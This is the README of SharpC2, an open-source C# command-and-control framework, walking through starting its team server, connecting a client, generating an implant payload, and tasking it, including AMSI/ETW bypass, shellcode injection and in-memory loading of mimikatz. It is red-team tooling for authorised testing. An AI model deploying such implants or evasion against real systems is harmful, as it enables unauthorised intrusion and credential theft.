[![Build Status](https://travis-ci.com/SharpC2/SharpC2.svg?branch=main)](https://travis-ci.com/SharpC2/SharpC2)
[![Documentation Status](https://readthedocs.org/projects/sharpc2/badge/?version=latest)](https://sharpc2.readthedocs.io/en/latest/?badge=latest)

# SharpC2

SharpC2 is a Command and Control Framework written in C#.

The solution consists of an ASP.NET Core Team Server, a .NET Framework Implant, and a .NET Client.

## Quick Start

The quickest way to have a play with the framework is clone the repo, then build and run the Debug versions.

### Start the Team Server

```
C:\SharpC2\TeamServer> dotnet build
TeamServer -> C:\SharpC2\TeamServer\bin\Debug\net5.0\TeamServer.dll

C:\SharpC2\TeamServer\bin\Debug\net5.0> dotnet TeamServer.dll --password Passw0rd!
info: Microsoft.Hosting.Lifetime[0]
      Now listening on: https://0.0.0.0:8443
info: Microsoft.Hosting.Lifetime[0]
      Application started. Press Ctrl+C to shut down.
info: Microsoft.Hosting.Lifetime[0]
      Hosting environment: Production
info: Microsoft.Hosting.Lifetime[0]
      Content root path: C:\SharpC2\TeamServer\bin\Debug\net5.0
```

**Note**:  If the server starts in `Development` mode, it will only listen for connections on the `localhost`.  To ensure it runs in `Production` mode (and therefore listen for connections on all interfaces) set the `ASPNETCORE_ENVIRONMENT` variable to `Production`.

### Start the Client

```
C:\SharpC2\Client> dotnet build
Client -> C:\SharpC2\Client\bin\Debug\net5.0\SharpC2.dll

C:\SharpC2\Client\bin\Debug\net5.0>dotnet SharpC2.dll
  ___ _                   ___ ___
 / __| |_  __ _ _ _ _ __ / __|_  )
 \__ \ ' \/ _` | '_| '_ \ (__ / /
 |___/_||_\__,_|_| | .__/\___/___|
                   |_|
    @_RastaMouse
    @_xpn_

(server)>
```

### Connect to the Team Server

```
(server)> localhost
(port)> 8443
(nick)> rasta
(pass)>

Server Certificate
------------------

[Subject]
  CN=localhost

[Issuer]
  CN=localhost

[Serial Number]
  67B4A5487F67745B

[Not Before]
  25/02/2021 21:01:43

[Not After]
  25/02/2022 21:01:43

[Thumbprint]
  B968C8D9C2B40F4AD7A46C92B0B700DEE46492FE

(accept? [y/N])> y
[drones] #
```

The client also supports command line arguments for faster setup.

```
C:\SharpC2\Client\bin\Debug\net5.0>dotnet SharpC2.dll --server localhost --port 8443 --nick rasta --password Passw0rd!
```

### Configure and Start the Default HTTP Handler

```
[drones] # handlers

[handlers] # list

Name          Running
----          -------
default-http  False

[handlers] # config default-http

[default-http] # show

Name            Value      Optional
----            -----      --------
BindPort        80         False
ConnectAddress  localhost  False
ConnectPort     80         False

[default-http] # set BindPort 8080
[default-http] # set ConnectPort 8080
[default-http] # show

Name            Value      Optional
----            -----      --------
BindPort        8080       False
ConnectAddress  localhost  False
ConnectPort     8080       False

[default-http] # start
[+] Handler "default-http" started.

[default-http] # back

[handlers] # list

Name          Running
----          -------
default-http  True
```

### Generate a Payload for the Handler

```
[drones] # payloads

[payloads] # show

Handler  Format  DllExport
-------  ------  ---------
         Exe     Execute

[payloads] # set Handler default-http

[payloads] # help generate

Generate payload
Usage: generate </output/path>

[payloads] # generate C:\Temp\drone.exe
[+] Saved 74240 bytes.
```

Execute the payload.

```
C:\Temp> drone.exe
```

### Interacting with a Drone

```
[drones] # list

Guid        Address      Hostname      Username  Process  PID    Arch  LastSeen
----        -------      --------      --------  -------  ---    ----  --------
655a3dea9d  172.20.64.1  Ghost-Canyon  Daniel    drone    32748  x64   0.29s

[drones] # interact 655a3dea9d

[655a3dea9d] # help

Name              Description
----              -----------
back              Back to previous screen
bypass            Set a directive to bypass AMSI/ETW on tasks
cd                Change working directory
execute-assembly  Execute a .NET assembly
exit              Exit this Drone
getuid            Get current identity
help              Get help
load-module       Load an external Drone module
ls                List filesystem
overload          Map and execute a native DLL
ps                List running processes
pwd               Print working directory
run               Run a command
shell             Run a command via cmd.exe
shinject          Inject arbitrary shellcode into a process
sleep             Set sleep interval and jitter

[655a3dea9d] # help overload
Map a native DLL into memory
Usage: overload [/path/to/dll] [export] <args>

[655a3dea9d] # overload C:\Tools\mimikatz\x64\powerkatz.dll powershell_reflective_mimikatz coffee
[+] Drone tasked: 668a2b4acb
[+] Drone checked in. Sent 1878149 bytes.
[+] Output received:

  .#####.   mimikatz 2.2.0 (x64) #19041 Mar  3 2021 14:35:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

[+] Task complete.
```

## Documentation

See more documentation on [Read the Docs](https://sharpc2.readthedocs.io/en/latest).